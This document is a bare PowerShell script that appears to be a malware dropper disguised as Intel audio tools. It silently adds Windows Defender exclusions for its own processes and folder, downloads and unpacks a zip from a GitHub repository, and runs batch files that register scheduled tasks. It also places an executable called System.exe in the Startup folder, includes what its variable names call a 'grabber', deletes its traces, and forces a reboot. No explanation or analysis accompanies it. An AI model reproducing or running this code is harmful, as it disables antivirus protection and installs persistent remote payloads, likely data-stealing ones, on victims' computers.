# PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Out-Null"

$TargetPath    = "C:\ProgramData\Intel\Audio"
$TargetZip     = "$TargetPath\audiotools.zip"
$TargetFile    = "$TargetPath\AudioTools.exe"
$TargetGrabber = "$TargetPath\Notify.exe"
$TargetSystem  = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\System.exe"
$TargetABat    = "$TargetPath\Register_Audio_Tools.bat"
$TargetNBat    = "$TargetPath\Register_Notification_Service.bat"
$TargetSBat    = "$TargetPath\Register_Schedule.bat"

Add-MpPreference -ExclusionProcess 'AudioTools.exe' -Force
Add-MpPreference -ExclusionProcess 'Notify.exe' -Force
Add-MpPreference -ExclusionProcess 'System.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Add-MpPreference -ExclusionPath "$TargetGrabber" -Force
Add-MpPreference -ExclusionPath "$TargetSystem" -Force

if (Test-Path "$TargetPath") {
  Remove-Item -Recurse -Force -Path "$TargetPath"
  New-Item -Path "$TargetPath" -ItemType Directory -Force
} else {
  New-Item -Path "$TargetPath" -ItemType Directory -Force
}

  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudio/raw/refs/heads/main/intelaudio.zip" -OutFile "$TargetZip"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Remove-Item -Path "$TargetZip"

if (Get-ScheduledTask -TaskName "AudioTools" -ErrorAction SilentlyContinue) {
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\AudioTools' /f"
  & $TargetABat
} else {
  & $TargetABat
}

if (Get-ScheduledTask -TaskName "Notify" -ErrorAction SilentlyContinue) {
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\Notify' /f"
  & $TargetNBat
} else {
  & $TargetNBat
}

if (Get-ScheduledTask -TaskName "Schedule" -ErrorAction SilentlyContinue) {
  Invoke-Expression -Command "schtasks.exe /delete /TN 'Apps\Schedule' /f"
  & $TargetSBat
} else {
  & $TargetSBat
}

Remove-Item -Path $TargetPath\Register_AudioTools.bat -Force
Remove-Item -Path $TargetPath\Register_Notify.bat -Force
Remove-Item -Path $TargetPath\Register_Schedule.bat -Force

Restart-Computer -Force